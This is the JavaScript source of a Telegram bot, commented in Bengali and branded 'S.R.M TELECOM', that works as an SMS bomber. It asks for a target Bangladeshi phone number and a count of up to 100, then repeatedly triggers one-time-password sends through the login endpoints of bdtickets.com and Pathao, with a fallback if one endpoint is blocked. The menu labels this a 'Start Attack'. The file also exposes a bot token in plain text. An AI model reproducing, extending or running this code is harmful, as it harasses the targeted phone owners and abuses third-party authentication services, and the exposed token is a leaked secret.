const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAFiS-NC-2BSnDauKrTM9GFQ3n91c6_OPfk';
const channelId = '@srmtelecom'; // আপনার চ্যানেলের ইউজারনেম (@ সহ)
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});
const userStates = {};

// Render/Cloud সচল রাখার জন্য সার্ভার
http.createServer((req, res) => {
    res.write("S.R.M TELECOM Server is Alive!");
    res.end();
}).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM (Color Emoji & JSON Body) চালু হয়েছে...");

// --- রঙিন ইমোজি বাটন (কিবোর্ডের নিচে থাকবে) ---
const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🔴 শুরু করুন (Start Attack)' }],
            [{ text: '📢 চ্যানেল জয়েন' }, { text: '💳 পেমেন্ট/হেল্প' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

// চ্যানেল জয়েন চেক করার ফাংশন
async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text) return;

    // ১. চ্যানেল জয়েন চেক
    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start') {
        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\n\nবটটি ব্যবহার করতে আমাদের চ্যানেলে জয়েন করুন।\n\n📢 লিংক: ${channelLink}\n\nজয়েন করে আবার /start দিন।`, { parse_mode: "Markdown" });
    }

    // ২. মেনু হ্যান্ডলার
    if (text === '/start') {
        bot.sendMessage(chatId, "🔥 **S.R.M TELECOM স্পেশাল বোম্বার**\n\nনিচের বাটন চেপে কাজ শুরু করুন।", mainMenu);
    }

    else if (text === '🔴 শুরু করুন (Start Attack)') {
        userStates[chatId] = { step: 'num' };
        bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**", { reply_markup: { remove_keyboard: true } });
    }

    else if (text === '📢 চ্যানেল জয়েন') {
        bot.sendMessage(chatId, `আমাদের অফিশিয়াল চ্যানেল: ${channelLink}`);
    }

    // ৩. বোম্বিং প্রসেস (আপনার দেওয়া JSON Body ফরম্যাটে)
    else if (userStates[chatId]?.step === 'num') {
        if (text.length === 11 && text.startsWith('01')) {
            userStates[chatId] = { step: 'amount', number: text };
            bot.sendMessage(chatId, `✅ নম্বর: ${text}\n🔢 **কয়টি SMS পাঠাতে চান? (১-১০০)**`);
        } else {
            bot.sendMessage(chatId, "❌ সঠিক নম্বর দিন (যেমন: 018XXXXXXXX)");
        }
    } 

    else if (userStates[chatId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount <= 0 || amount > 100) return bot.sendMessage(chatId, "⚠️ ১-১০০ এর মধ্যে লিখুন।");

        const target = userStates[chatId].number;
        delete userStates[chatId];

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে পাওয়ারফুল অ্যাটাক শুরু...`);

        let success = 0;
        for (let i = 0; i < amount; i++) {
            try {
                // আপনার দেওয়া সেই নির্দিষ্ট বডি ও হেডার ফরম্যাট
                await axios.post('https://api.bdtickets.com:20100/v1/auth', {
                    createUserCheck: true,
                    phoneNumber: "+88" + target,
                    applicationChannel: "WEB_APP"
                }, {
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    },
                    timeout: 5000
                });
                success++;
            } catch (e) {
                // ব্যাকআপ API (যদি মেইনটি ব্লক হয়)
                try {
                    await axios.post('https://api-hermes.pathao.com/user/otp/send', { phone: "+88" + target, reason: "login" });
                    success++;
                } catch (err) {}
            }
            await new Promise(r => setTimeout(r, 1500)); // ১.৫ সেকেন্ড গ্যাপ (মাস্ট!)
        }

        bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল: ${success}টি`, mainMenu);
    }
});

